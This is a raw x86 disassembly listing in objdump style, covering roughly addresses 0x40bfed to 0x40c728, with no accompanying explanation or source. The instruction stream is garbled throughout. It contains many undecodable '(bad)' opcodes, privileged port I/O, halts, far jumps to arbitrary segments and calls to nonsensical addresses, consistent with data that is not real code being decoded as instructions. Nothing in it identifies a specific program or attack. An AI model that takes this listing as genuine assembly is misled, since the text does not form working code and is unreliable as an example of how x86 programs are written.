  40bfed:	xor    eax,0xf201a0cc
  40bff2:	mov    al,0xa3
  40bff4:	hlt    
  40bff5:	mov    ch,dh
  40bff7:	fdiv   st,st(0)
  40bff9:	adc    BYTE PTR [ebp+0x498fcfc],bh
  40bfff:	sbb    dh,dl
  40c001:	cdq    
  40c002:	mov    bl,0xdf
  40c004:	mov    cl,0xe0
  40c006:	pop    ss
  40c007:	repz jmp 0x884a:0x58685c9a
  40c00f:	(bad)  [ebx+0x697cee33]
  40c015:	cs pop esi
  40c017:	cli    
  40c018:	dec    eax
  40c019:	fs in  al,0xd3
  40c01c:	fs in  al,0xfc
  40c01f:	je     0x40c090
  40c021:	hlt    
  40c022:	or     al,0xe6
  40c024:	jl     0x40c09d
  40c026:	jecxz  0x40bfd6
  40c028:	fstp   TBYTE PTR gs:[ecx]
  40c02b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c02c:	ficomp WORD PTR [eax-0x6f49b05a]
  40c032:	cld    
  40c033:	jmp    0x40c076
  40c035:	shr    ebp,1
  40c037:	mov    eax,0x8c23a0ed
  40c03c:	sti    
  40c03d:	push   ecx
  40c03e:	out    dx,eax
  40c03f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c040:	and    al,BYTE PTR [esi+0x18]
  40c043:	div    BYTE PTR [eax]
  40c045:	lods   al,BYTE PTR ss:[esi]
  40c047:	fld    DWORD PTR [esi-0x24]
  40c04a:	xchg   esp,eax
  40c04b:	jl     0x40c01b
  40c04d:	xchg   ecx,eax
  40c04e:	int3   
  40c04f:	stos   DWORD PTR es:[edi],eax
  40c050:	xor    dl,dh
  40c052:	or     al,0xa6
  40c054:	push   es
  40c055:	add    BYTE PTR [eax],dl
  40c057:	rol    cl,1
  40c059:	inc    ebp
  40c05a:	and    ah,BYTE PTR [eax+0x33f457c2]
  40c060:	jbe    0xb9c6a70f
  40c066:	add    eax,0xfcd25d17
  40c06b:	xchg   ebx,eax
  40c06c:	push   esi
  40c06d:	les    ebx,FWORD PTR [edi+eiz*8+0x6]
  40c071:	out    dx,eax
  40c072:	add    ah,BYTE PTR [esi]
  40c074:	lock add dl,bh
  40c077:	mov    eax,0x1457a19d
  40c07c:	loope  0x40c0b0
  40c07e:	cmp    ebp,DWORD PTR [eax+eiz*4+0x56]
  40c082:	fwait
  40c083:	push   esi
  40c084:	or     edx,esp
  40c086:	jecxz  0x40c020
  40c088:	mov    ecx,0x5db30f7c
  40c08d:	ret    
  40c08e:	mov    ecx,cs
  40c090:	and    bh,BYTE PTR [eax]
  40c092:	outs   dx,DWORD PTR ds:[esi]
  40c093:	xor    DWORD PTR [ebp+0x39],ebp
  40c096:	pop    edx
  40c097:	repnz pop edx
  40c099:	jns    0x40c112
  40c09b:	mov    DWORD PTR ss:[ecx-0x3],0x9a1e67bb
  40c0a3:	mov    ds:0xc44a4cd9,al
  40c0a8:	adc    eax,0xf647911b
  40c0ad:	in     al,dx
  40c0ae:	mov    dh,ch
  40c0b0:	pop    esi
  40c0b1:	xor    BYTE PTR [ebp+0x262eb96f],dl
  40c0b7:	in     eax,dx
  40c0b8:	cld    
  40c0b9:	adc    BYTE PTR [edx],dh
  40c0bb:	outs   dx,BYTE PTR ds:[esi]
  40c0bc:	retf   0x79ca
  40c0bf:	or     al,0x97
  40c0c1:	fwait
  40c0c2:	xchg   ebx,eax
  40c0c3:	dec    edx
  40c0c4:	or     al,0x6e
  40c0c6:	out    0x2c,al
  40c0c8:	int    0xf
  40c0ca:	lds    ebp,FWORD PTR ds:0x1ebf7271
  40c0d0:	lods   al,BYTE PTR ds:[esi]
  40c0d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0d2:	pop    ss
  40c0d3:	rcr    BYTE PTR [ebp+eiz*1-0x33],1
  40c0d7:	cmp    DWORD PTR [ecx],0xd8408bc9
  40c0dd:	sbb    al,0x88
  40c0df:	mov    eax,ds:0xde0e4950
  40c0e4:	xor    eax,0x266d205
  40c0e9:	add    ebx,edx
  40c0eb:	shl    ebp,0xc0
  40c0ee:	jb     0x40c0ff
  40c0f0:	pop    esi
  40c0f1:	getsec 
  40c0f3:	inc    ebp
  40c0f4:	xor    bh,BYTE PTR [ecx-0x584a421]
  40c0fa:	sbb    bh,al
  40c0fc:	test   al,0x9c
  40c0fe:	dec    edx
  40c0ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c100:	push   edx
  40c101:	cdq    
  40c102:	jge    0x40c15b
  40c104:	in     eax,0x29
  40c106:	imul   ebx,DWORD PTR [edi+0x78f9b46e],0x1d858eb9
  40c110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c111:	mov    ch,0x40
  40c113:	inc    ecx
  40c114:	cld    
  40c115:	and    ecx,DWORD PTR [ebp-0x6e7b211f]
  40c11b:	aad    0x42
  40c11d:	pop    ebp
  40c11e:	sub    al,0x4c
  40c120:	(bad)  
  40c121:	dec    ebx
  40c122:	pop    es
  40c123:	xchg   ecx,eax
  40c124:	out    0xf0,eax
  40c126:	inc    eax
  40c127:	xrelease mov BYTE PTR [edi+0x53],bh
  40c12b:	out    dx,eax
  40c12c:	test   al,0x74
  40c12e:	push   es
  40c12f:	cmp    edx,ebp
  40c131:	jl     0x40c144
  40c133:	xor    DWORD PTR [esi-0x42],0x5b
  40c137:	lea    edi,[edx-0x1b]
  40c13a:	shl    BYTE PTR [edx],0xe3
  40c13d:	cmp    BYTE PTR [eax+eiz*2-0x40],0x2
  40c142:	mov    esi,0x597fec51
  40c147:	add    ebx,DWORD PTR [eax+0x1e]
  40c14a:	mov    dh,0xb2
  40c14c:	cwde   
  40c14d:	mov    dh,0xdc
  40c14f:	retf   
  40c150:	leave  
  40c151:	mov    al,bh
  40c153:	pop    esp
  40c154:	repnz in eax,dx
  40c156:	push   es
  40c157:	mov    esi,0xaf0f8ab4
  40c15c:	hlt    
  40c15d:	imul   esp,DWORD PTR [edx],0x52
  40c160:	ror    edi,0x7e
  40c163:	arpl   di,dx
  40c165:	into   
  40c166:	sbb    eax,0xe77a9628
  40c16b:	jnp    0x40c18f
  40c16d:	mov    ebp,0x3864f33
  40c172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c173:	pop    esi
  40c174:	hlt    
  40c175:	xchg   esi,eax
  40c176:	lods   al,BYTE PTR ds:[esi]
  40c177:	pop    edi
  40c178:	xchg   ebx,eax
  40c179:	das    
  40c17a:	xor    al,0x6a
  40c17c:	sub    ebp,DWORD PTR [ecx+0x42]
  40c17f:	aam    0x89
  40c181:	or     DWORD PTR [edi],0x45beb45
  40c187:	inc    ebx
  40c188:	push   ss
  40c189:	sub    DWORD PTR [ecx+0x609cac22],0x36292126
  40c193:	mov    edx,DWORD PTR [edx]
  40c195:	into   
  40c196:	inc    esi
  40c197:	adc    BYTE PTR [eax-0x432a3c6e],ah
  40c19d:	pop    edx
  40c19e:	ret    
  40c19f:	mov    ah,0x3d
  40c1a1:	or     ebx,DWORD PTR [esi+0x493b365]
  40c1a7:	push   ebp
  40c1a8:	mov    ah,0x39
  40c1aa:	or     DWORD PTR [eax+0x493c046a],ecx
  40c1b0:	or     dh,BYTE PTR [ebx]
  40c1b2:	mov    eax,ds:0x9ab630c8
  40c1b7:	mov    al,0xa9
  40c1b9:	scas   eax,DWORD PTR es:[edi]
  40c1ba:	jecxz  0x40c1b0
  40c1bc:	out    0xda,eax
  40c1be:	or     bl,BYTE PTR [ebx+ebp*8-0x214d963b]
  40c1c5:	adc    bh,bl
  40c1c7:	pusha  
  40c1c8:	in     al,0x9c
  40c1ca:	mov    dh,0x22
  40c1cc:	pop    ebx
  40c1cd:	or     al,0x4a
  40c1cf:	rol    BYTE PTR [esi],cl
  40c1d1:	jne    0x40c1cf
  40c1d3:	or     ah,al
  40c1d5:	repnz pop eax
  40c1d7:	pushf  
  40c1d8:	in     al,dx
  40c1d9:	add    cl,dl
  40c1db:	js     0x40c1df
  40c1dd:	or     bh,BYTE PTR ds:0x94ecb0fe
  40c1e3:	or     cl,BYTE PTR [edx+0x79]
  40c1e6:	xor    eax,DWORD PTR [ecx+0x3e4fa50]
  40c1ec:	repnz adc al,0x49
  40c1ef:	mov    esp,0xc4150368
  40c1f4:	pop    edi
  40c1f5:	push   eax
  40c1f6:	addr16 inc edi
  40c1f8:	sbb    al,0xcb
  40c1fa:	xor    dh,BYTE PTR [esp+ebp*8]
  40c1fd:	xor    al,0xad
  40c1ff:	ret    
  40c200:	dec    esp
  40c201:	pop    ebx
  40c202:	pop    ecx
  40c203:	test   eax,0x29e61a48
  40c208:	add    esp,esp
  40c20a:	jns    0x40c1b5
  40c20c:	mov    al,0x1d
  40c20e:	push   cs
  40c20f:	mov    al,0x26
  40c211:	les    edx,FWORD PTR [ebx+0x6302aeae]
  40c217:	aam    0x93
  40c219:	mov    ch,0x12
  40c21b:	js     0xac2d9f4a
  40c221:	inc    ecx
  40c222:	out    0x33,al
  40c224:	(bad)  
  40c225:	pop    esi
  40c226:	pop    esp
  40c227:	(bad)  
  40c229:	and    edx,DWORD PTR [edi-0x43]
  40c22c:	bound  edi,QWORD PTR [ecx+esi*2]
  40c22f:	dec    edi
  40c231:	mov    esp,fs
  40c233:	jge    0x40c26c
  40c235:	adc    al,0x41
  40c237:	and    ebp,ebp
  40c239:	ja     0x40c204
  40c23b:	or     DWORD PTR [edx-0x475092b2],ebx
  40c241:	dec    esp
  40c242:	sti    
  40c243:	gs stos DWORD PTR es:[edi],eax
  40c245:	inc    ebp
  40c246:	adc    al,0x80
  40c248:	outs   dx,BYTE PTR ds:[esi]
  40c249:	pop    edx
  40c24a:	les    ebp,FWORD PTR [ebp-0x4e]
  40c24d:	int3   
  40c24e:	jp     0x40c278
  40c250:	inc    edi
  40c251:	es es scas eax,DWORD PTR es:[edi]
  40c254:	pop    ds
  40c255:	push   es
  40c256:	inc    ebx
  40c257:	mov    cl,bh
  40c259:	mov    cl,0xf3
  40c25b:	std    
  40c25c:	push   edi
  40c25d:	dec    edi
  40c25e:	pop    edi
  40c25f:	mov    al,0x40
  40c261:	retf   
  40c262:	fdivr  st,st(5)
  40c264:	push   ss
  40c265:	sub    ah,dh
  40c267:	xor    al,0x1c
  40c269:	es scas al,BYTE PTR es:[edi]
  40c26b:	pop    esi
  40c26c:	and    DWORD PTR [esi-0x79a0455a],edx
  40c272:	loopne 0x40c2a9
  40c274:	test   al,0xc9
  40c276:	cld    
  40c277:	sbb    DWORD PTR [ecx-0x8],esp
  40c27a:	rol    BYTE PTR [ebp+edi*1-0x72e81171],cl
  40c281:	gs in  eax,0x60
  40c284:	jmp    0xe816:0x46932914
  40c28b:	xor    cl,bl
  40c28d:	add    edi,DWORD PTR [eax]
  40c28f:	sub    DWORD PTR [edi+0x1196e1d],edx
  40c295:	mov    bl,0xa6
  40c297:	cmp    DWORD PTR [ebx],eax
  40c299:	lea    esp,[ebx+eiz*8-0x3a35da7a]
  40c2a0:	adc    al,0x4
  40c2a2:	pop    ebx
  40c2a3:	add    BYTE PTR [esi+esi*1],al
  40c2a6:	or     BYTE PTR [eax],bl
  40c2a8:	inc    esi
  40c2a9:	popf   
  40c2aa:	jecxz  0x40c274
  40c2ac:	stos   BYTE PTR es:[edi],al
  40c2ad:	clc    
  40c2ae:	shr    DWORD PTR [edi+0x398da2b],1
  40c2b4:	(bad)  
  40c2b5:	jp     0x40c31c
  40c2b7:	mov    bh,BYTE PTR [ecx]
  40c2b9:	mov    al,0xa5
  40c2bb:	in     eax,dx
  40c2bc:	add    BYTE PTR [ebp+0x2e],bl
  40c2bf:	push   cs
  40c2c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2c1:	xchg   ebx,eax
  40c2c2:	xor    DWORD PTR [esi],esi
  40c2c4:	and    eax,DWORD PTR [edx+0x23c743c0]
  40c2ca:	retf   
  40c2cb:	popf   
  40c2cc:	jne    0x40c29d
  40c2ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2cf:	push   edx
  40c2d0:	cmp    al,0x55
  40c2d2:	mov    esi,0xd470fbe8
  40c2d7:	jmp    0xa32e:0xa146d9c3
  40c2de:	mov    cl,BYTE PTR [edi-0x26c981b]
  40c2e4:	xor    eax,0x759d4cbd
  40c2e9:	dec    ecx
  40c2ea:	and    edi,DWORD PTR [edx]
  40c2ec:	sub    edi,DWORD PTR [edx-0x45]
  40c2ef:	mov    dh,0xd1
  40c2f1:	jae    0x40c2cf
  40c2f3:	rol    DWORD PTR [ecx-0x3e4582b1],1
  40c2f9:	jb     0x40c354
  40c2fb:	push   edi
  40c2fc:	repnz pusha 
  40c2fe:	outs   dx,BYTE PTR ds:[esi]
  40c2ff:	and    al,0xd4
  40c301:	les    eax,FWORD PTR [ecx+edi*1]
  40c304:	int    0x82
  40c306:	mov    ebx,0x1082521
  40c30b:	lock xchg esp,eax
  40c30d:	pop    edx
  40c30e:	add    DWORD PTR [ecx],ebx
  40c310:	ja     0x40c354
  40c312:	iret   
  40c313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c314:	out    0xe4,al
  40c316:	outs   dx,DWORD PTR ds:[esi]
  40c317:	pop    ds
  40c318:	mov    ecx,0x49a7c9c7
  40c31d:	(bad)  
  40c31e:	pop    ds
  40c31f:	xchg   ebx,eax
  40c320:	outs   dx,DWORD PTR ds:[esi]
  40c321:	push   es
  40c322:	mov    ah,BYTE PTR [edi+edx*8+0x67]
  40c326:	mov    edi,0x24664c82
  40c32b:	adc    eax,0xeda057fd
  40c330:	ror    cl,0xaf
  40c333:	and    eax,0x218c4936
  40c338:	mov    ebp,0x5bd25873
  40c33d:	adc    DWORD PTR [ecx],esi
  40c33f:	sbb    edi,esi
  40c341:	push   es
  40c342:	pop    ds
  40c343:	test   BYTE PTR [edx+eiz*1],0x17
  40c347:	daa    
  40c348:	call   0xf59338e5
  40c34d:	sub    edx,ebx
  40c34f:	rol    DWORD PTR [esi+ecx*1+0x54],0xe2
  40c354:	into   
  40c355:	cmp    bl,BYTE PTR [edi]
  40c357:	std    
  40c358:	ror    DWORD PTR [edi+ecx*2],cl
  40c35b:	sti    
  40c35c:	cmp    BYTE PTR ds:[ecx],bl
  40c35f:	aad    0x1f
  40c361:	int3   
  40c362:	pop    edi
  40c363:	push   ebx
  40c364:	adc    al,0xee
  40c366:	sub    DWORD PTR [ecx-0x2d6ff822],0x4fd01b6c
  40c370:	mov    eax,ds:0x689cc3f8
  40c375:	jbe    0x40c3c6
  40c377:	dec    eax
  40c378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c379:	mov    ebp,0xccf2baa8
  40c37e:	(bad)  
  40c37f:	inc    esi
  40c380:	leave  
  40c381:	cmp    eax,0x53e8e78e
  40c386:	test   edi,0xe2286be1
  40c38c:	and    dh,BYTE PTR [edi]
  40c38e:	aas    
  40c38f:	xor    ebp,DWORD PTR [edi]
  40c391:	xchg   edx,eax
  40c392:	add    eax,0x57124e15
  40c397:	aam    0x70
  40c399:	sub    ebp,ecx
  40c39b:	inc    ecx
  40c39c:	jmp    0x40c3b8
  40c39e:	ficomp WORD PTR [ecx]
  40c3a0:	lock lock movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40c3a4:	dec    esi
  40c3a5:	mov    ecx,0x4dbb8a59
  40c3aa:	stc    
  40c3ab:	jle    0x40c341
  40c3ad:	add    edx,ebp
  40c3af:	inc    esp
  40c3b0:	jnp    0x40c3fc
  40c3b2:	adc    al,0x3b
  40c3b4:	cmp    cl,al
  40c3b6:	push   edi
  40c3b7:	ins    BYTE PTR es:[edi],dx
  40c3b8:	imul   esp,DWORD PTR [esi+0x749395d6],0x2d4d1cbc
  40c3c2:	stos   DWORD PTR es:[edi],eax
  40c3c3:	add    eax,0x49009d6c
  40c3c8:	retf   0x51e0
  40c3cb:	add    ch,BYTE PTR [ecx]
  40c3cd:	and    al,BYTE PTR [ecx-0x64d6c973]
  40c3d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3d4:	adc    BYTE PTR [ecx-0x62cae4de],bh
  40c3da:	ret    
  40c3db:	scas   al,BYTE PTR es:[edi]
  40c3dc:	(bad)  
  40c3dd:	clc    
  40c3de:	mov    ecx,0x8193b00e
  40c3e3:	push   ecx
  40c3e4:	ret    
  40c3e5:	inc    ebp
  40c3e6:	sub    eax,0x74b2a9fe
  40c3ec:	pusha  
  40c3ed:	sar    edi,0x21
  40c3f0:	aad    0xdf
  40c3f2:	lods   eax,DWORD PTR ds:[esi]
  40c3f3:	std    
  40c3f4:	mov    eax,0x6fbf0120
  40c3f9:	pushf  
  40c3fa:	or     eax,0xffe646df
  40c3ff:	jg     0x40c3ad
  40c401:	xor    eax,0xe72028ef
  40c406:	push   0x9cf830cf
  40c40b:	xor    cl,BYTE PTR [ecx+0x31]
  40c40e:	pusha  
  40c40f:	push   cs
  40c410:	(bad)  
  40c411:	adc    BYTE PTR [ecx-0x1e],al
  40c414:	add    BYTE PTR [eax],dh
  40c416:	clc    
  40c417:	dec    DWORD PTR [ebx]
  40c419:	add    DWORD PTR [edi],esp
  40c41b:	ret    
  40c41c:	or     al,0xde
  40c41e:	mov    esi,0x22c7c5d9
  40c423:	repz (bad) 
  40c425:	adc    bh,BYTE PTR [esi]
  40c427:	sti    
  40c428:	sbb    BYTE PTR [esi+0x424b3ce3],ch
  40c42e:	frstor [edi]
  40c430:	jge    0x40c438
  40c432:	adc    eax,0x4a9161
  40c437:	xchg   BYTE PTR fs:[edx+0x697b3a33],dh
  40c43e:	xlat   BYTE PTR ds:[ebx]
  40c43f:	je     0x40c444
  40c441:	mov    bl,0x72
  40c443:	inc    eax
  40c444:	cwde   
  40c445:	dec    edx
  40c446:	jle    0x40c492
  40c448:	std    
  40c449:	push   es
  40c44a:	fistp  WORD PTR [eax-0x16]
  40c44d:	push   cs
  40c44e:	(bad)  
  40c44f:	push   es
  40c450:	sbb    ebx,DWORD PTR [esi+eiz*4-0x17]
  40c454:	jno    0x40c47b
  40c456:	outs   dx,DWORD PTR ds:[esi]
  40c457:	sbb    BYTE PTR [ebp+0x3946f694],cl
  40c45d:	iret   
  40c45e:	cdq    
  40c45f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c460:	fdivr  QWORD PTR [bx+0x1884]
  40c465:	pop    ebp
  40c466:	dec    edx
  40c467:	xchg   ebx,eax
  40c468:	sbb    al,dh
  40c46a:	or     BYTE PTR [edi+0x6ba133e],al
  40c470:	arpl   WORD PTR [edx],bp
  40c472:	retf   
  40c473:	mov    edx,0xfac29f88
  40c478:	inc    esp
  40c479:	pop    es
  40c47a:	fistp  QWORD PTR [edi-0x2a]
  40c47d:	inc    edx
  40c47e:	ss mov dh,0xf2
  40c481:	jmp    0x40c4ef
  40c483:	shr    edx,cl
  40c485:	xor    eax,0x9fce4e6d
  40c48a:	xor    al,0x30
  40c48c:	inc    ebp
  40c48d:	push   ebx
  40c48e:	add    BYTE PTR [ecx+0x10],0x2a
  40c492:	push   cs
  40c493:	jbe    0x40c486
  40c495:	leave  
  40c496:	je     0x40c48e
  40c498:	mov    ebx,0xc1d3dee5
  40c49d:	push   0xf9e9957f
  40c4a2:	add    ah,ah
  40c4a4:	(bad)  
  40c4a5:	cld    
  40c4a6:	mov    cl,0x6c
  40c4a8:	xchg   esi,eax
  40c4a9:	sbb    eax,0x43392653
  40c4ae:	mov    BYTE PTR [edx+0x23],ah
  40c4b1:	mov    ch,0x22
  40c4b3:	jmp    FWORD PTR [esi+0x7cc26a87]
  40c4b9:	(bad)  
  40c4ba:	mov    ecx,0xd8f83044
  40c4bf:	add    edi,edi
  40c4c1:	push   edi
  40c4c2:	or     ch,BYTE PTR [esi+0xbfd054d]
  40c4c8:	call   0x118de8bc
  40c4cd:	lea    edx,[ecx]
  40c4cf:	push   edx
  40c4d0:	(bad)  
  40c4d1:	and    al,0xa8
  40c4d3:	or     al,0xb1
  40c4d5:	jb     0x40c493
  40c4d7:	push   edx
  40c4d8:	jo     0x40c4f2
  40c4da:	js     0x40c51d
  40c4dc:	xor    al,0x7c
  40c4de:	or     edx,DWORD PTR [ebx+0x2a]
  40c4e1:	inc    edx
  40c4e2:	push   ss
  40c4e3:	pop    ds
  40c4e4:	mov    es,WORD PTR [ebx+0xd35e105]
  40c4ea:	out    0x55,al
  40c4ec:	(bad)  
  40c4ed:	xor    al,0x1e
  40c4ef:	and    esi,ebp
  40c4f1:	push   es
  40c4f2:	xchg   esi,eax
  40c4f3:	lods   eax,DWORD PTR ds:[esi]
  40c4f4:	pop    ebp
  40c4f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4f6:	and    BYTE PTR [esi-0x60],0xad
  40c4fa:	iret   
  40c4fb:	(bad)  
  40c4fc:	and    ecx,DWORD PTR [edx-0x55db89c7]
  40c502:	das    
  40c503:	add    BYTE PTR [ebx],ch
  40c505:	aam    0xec
  40c507:	sub    al,0xfb
  40c509:	in     al,dx
  40c50a:	fist   WORD PTR [eax-0x66b40049]
  40c510:	rcl    BYTE PTR [edx+0x2c5c322e],1
  40c516:	mov    edi,0x4c73be0c
  40c51b:	sbb    DWORD PTR [eax-0x804fdf4],0xb4c53fc4
  40c525:	pop    esi
  40c526:	in     al,dx
  40c527:	add    DWORD PTR [ecx+0x5da1a166],ebx
  40c52d:	dec    ebp
  40c52e:	dec    esp
  40c52f:	aaa    
  40c530:	mov    ebp,0xebc5fd23
  40c535:	mov    ebp,0x1c992799
  40c53a:	xchg   DWORD PTR [ebp-0x66],esp
  40c53d:	sbb    eax,DWORD PTR [ecx+0x5963a9dc]
  40c543:	in     eax,0x42
  40c545:	cmc    
  40c546:	scas   eax,DWORD PTR es:[edi]
  40c547:	in     al,dx
  40c548:	std    
  40c549:	pop    esp
  40c54a:	lahf   
  40c54b:	mov    fs,WORD PTR [ecx-0x73]
  40c54e:	mov    ebx,0x3af79362
  40c553:	mov    al,BYTE PTR [edi]
  40c555:	js     0x40c50a
  40c557:	mov    bl,0x99
  40c559:	jno    0x40c5d5
  40c55b:	ins    BYTE PTR es:[edi],dx
  40c55c:	pop    ebx
  40c55d:	(bad)  
  40c55f:	ror    BYTE PTR [ecx],0xd4
  40c562:	fucomi st,st(3)
  40c564:	arpl   WORD PTR [ebx-0x697b7d6d],sp
  40c56a:	push   ss
  40c56b:	add    BYTE PTR ds:0x266c1f63,0xe3
  40c572:	sbb    BYTE PTR [eax],al
  40c574:	sbb    dl,BYTE PTR [edi+ecx*1]
  40c577:	jecxz  0x40c54e
  40c579:	stc    
  40c57a:	push   ss
  40c57b:	jbe    0x40c59e
  40c57d:	xor    eax,0x4f3fa34b
  40c582:	out    0xd,al
  40c584:	sub    esi,DWORD PTR [edx]
  40c586:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c587:	mov    esi,0x926dd90f
  40c58c:	add    bh,BYTE PTR [edx-0x2b]
  40c58f:	and    al,0x5b
  40c591:	and    bh,ch
  40c593:	add    DWORD PTR [ecx-0xee8ad6d],0x77
  40c59a:	jmp    0x52d74981
  40c59f:	test   DWORD PTR [ecx],esp
  40c5a1:	xor    DWORD PTR [edi-0x27],esp
  40c5a4:	pop    ds
  40c5a5:	mov    BYTE PTR [edx+0x3fcf95dd],ch
  40c5ab:	push   0x3a8d7d2d
  40c5b0:	ds mov esi,0x1867fdc
  40c5b6:	and    BYTE PTR ds:0x7d2610bf,ah
  40c5bc:	sub    al,0xd6
  40c5be:	push   ss
  40c5bf:	mov    ebp,0xe2303128
  40c5c4:	push   ecx
  40c5c5:	mov    ebp,0xd2ebc271
  40c5ca:	and    BYTE PTR [ecx-0x63],al
  40c5cd:	push   0x909debaa
  40c5d2:	fmul   DWORD PTR [eax+0x50]
  40c5d5:	pop    esi
  40c5d6:	add    esp,DWORD PTR [edi-0x6cfadf3f]
  40c5dc:	pop    edx
  40c5dd:	stc    
  40c5de:	data16 scas al,BYTE PTR es:[edi]
  40c5e0:	fild   WORD PTR [edi+0x15da4bec]
  40c5e6:	pop    ds
  40c5e7:	sub    BYTE PTR [eax],ah
  40c5e9:	fwait
  40c5ea:	sahf   
  40c5eb:	xlat   BYTE PTR ds:[ebx]
  40c5ec:	inc    edx
  40c5ed:	mov    edi,0x5a8bfdf5
  40c5f2:	fwait
  40c5f3:	and    BYTE PTR [ebx+0x750e3d08],bh
  40c5f9:	dec    edi
  40c5fa:	outs   dx,DWORD PTR ds:[esi]
  40c5fb:	push   edi
  40c5fc:	ja     0x40c5a7
  40c5fe:	(bad)  
  40c5ff:	(bad)  
  40c601:	xor    eax,0xaedfe884
  40c606:	pop    ebx
  40c607:	dec    DWORD PTR [ebx]
  40c609:	cdq    
  40c60a:	jmp    0xaea13060
  40c60f:	adc    al,dh
  40c611:	pushf  
  40c612:	jne    0x40c5a2
  40c614:	imul   edx,DWORD PTR [edx],0x3f
  40c617:	xor    eax,DWORD PTR [ecx+0x1127630a]
  40c61d:	cmp    dh,BYTE PTR [edi+0xc82c249]
  40c623:	push   ecx
  40c624:	pop    ebp
  40c625:	jl     0x40c67e
  40c627:	scas   eax,DWORD PTR es:[edi]
  40c628:	adc    DWORD PTR [ebx+0x1c],edi
  40c62b:	xor    esp,DWORD PTR [ecx+0x2]
  40c62e:	(bad)  
  40c62f:	ret    0x4af6
  40c632:	pop    esi
  40c633:	in     al,dx
  40c634:	pop    ss
  40c635:	shr    BYTE PTR [edx+edi*1],cl
  40c638:	fisubr WORD PTR [edi+ebp*2]
  40c63b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c63c:	(bad)  
  40c63d:	push   ebp
  40c63e:	sbb    DWORD PTR [ebx+0x366efdf9],eax
  40c644:	and    cl,BYTE PTR [edx+ecx*4-0x3b73b4e8]
  40c64b:	out    0x57,eax
  40c64d:	xor    dl,0x9b
  40c650:	mov    ebx,ecx
  40c652:	sahf   
  40c653:	mov    BYTE PTR [esp-0x3e13d08],dh
  40c65a:	sbb    DWORD PTR [esi-0x220b0ab],0xffffffd6
  40c661:	bound  ecx,QWORD PTR [eax+eiz*8-0x1a]
  40c665:	mov    ecx,0x8d664456
  40c66a:	xchg   esi,eax
  40c66b:	outs   dx,DWORD PTR ds:[esi]
  40c66c:	push   edi
  40c66d:	jp     0x40c699
  40c66f:	add    bh,BYTE PTR [eax+0x5f7d5d0d]
  40c675:	mov    bl,0xf0
  40c677:	popa   
  40c678:	jle    0x40c662
  40c67a:	or     ecx,edx
  40c67c:	mov    dl,0x89
  40c67e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c67f:	mov    esi,0xa3aebdc1
  40c684:	test   al,0x3e
  40c686:	stos   DWORD PTR es:[edi],eax
  40c687:	inc    ebp
  40c688:	cli    
  40c689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c68a:	jns    0x40c6f7
  40c68c:	retf   
  40c68d:	adc    eax,0xbd7f50de
  40c692:	add    ebp,edx
  40c694:	mov    ebp,0xe035c795
  40c699:	fstp   DWORD PTR [ebx-0x511e85a1]
  40c69f:	mov    BYTE PTR [edx+edi*1],bl
  40c6a2:	add    eax,0xbc588c6e
  40c6a7:	mov    DWORD PTR [esi],esp
  40c6a9:	outs   dx,BYTE PTR ds:[esi]
  40c6aa:	mov    WORD PTR [ebx],ds
  40c6ac:	or     edi,ecx
  40c6ae:	xor    esi,DWORD PTR [esi]
  40c6b0:	inc    edi
  40c6b1:	jns    0x40c6e3
  40c6b3:	sub    ebx,DWORD PTR [eax-0x1339d258]
  40c6b9:	add    al,0x7c
  40c6bb:	test   eax,0xae12638d
  40c6c0:	bound  ebp,QWORD PTR [edi+esi*1]
  40c6c3:	lahf   
  40c6c4:	sub    DWORD PTR [eax-0x6c],esp
  40c6c7:	pop    es
  40c6c8:	js     0x40c661
  40c6ca:	xchg   edx,eax
  40c6cb:	aaa    
  40c6cc:	(bad)  
  40c6cd:	sub    al,0xef
  40c6cf:	mov    al,BYTE PTR [ecx+esi*8]
  40c6d2:	cmc    
  40c6d3:	outs   dx,DWORD PTR ds:[esi]
  40c6d4:	xchg   edx,eax
  40c6d5:	popf   
  40c6d6:	lods   al,BYTE PTR ds:[esi]
  40c6d7:	xchg   ecx,eax
  40c6d8:	pop    edi
  40c6d9:	xchg   edx,eax
  40c6da:	pop    esi
  40c6db:	hlt    
  40c6dc:	(bad)  
  40c6de:	mov    esi,0xdd133c03
  40c6e3:	cli    
  40c6e4:	jo     0x40c6fa
  40c6e6:	xchg   DWORD PTR [eax+edx*1],ebp
  40c6e9:	and    BYTE PTR [edx],bh
  40c6eb:	scas   eax,DWORD PTR es:[edi]
  40c6ec:	xchg   DWORD PTR [edi-0x32da32de],ebx
  40c6f2:	scas   eax,DWORD PTR es:[edi]
  40c6f3:	mov    dh,0xb3
  40c6f5:	cmp    ch,BYTE PTR [edi]
  40c6f7:	mov    eax,ds:0x9697d1e6
  40c6fc:	fild   DWORD PTR [edi+0x5e]
  40c6ff:	mov    ebp,0xd2c14e5c
  40c704:	fsubr  st,st(7)
  40c706:	push   0xffffff9d
  40c708:	stc    
  40c709:	adc    ebp,esi
  40c70b:	cld    
  40c70c:	adc    BYTE PTR [ebx],0x59
  40c70f:	loope  0x40c6b4
  40c711:	popf   
  40c712:	rcl    bh,1
  40c714:	rol    BYTE PTR [esp+ebp*2],cl
  40c717:	fistp  WORD PTR [ebp+0x6c]
  40c71a:	cwde   
  40c71b:	cmp    ch,BYTE PTR [ebx+eiz*1-0x57bac2c]
  40c722:	cmp    BYTE PTR [eax-0x6d],0xcf
  40c726:	push   es
  40c727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c728:	hlt    
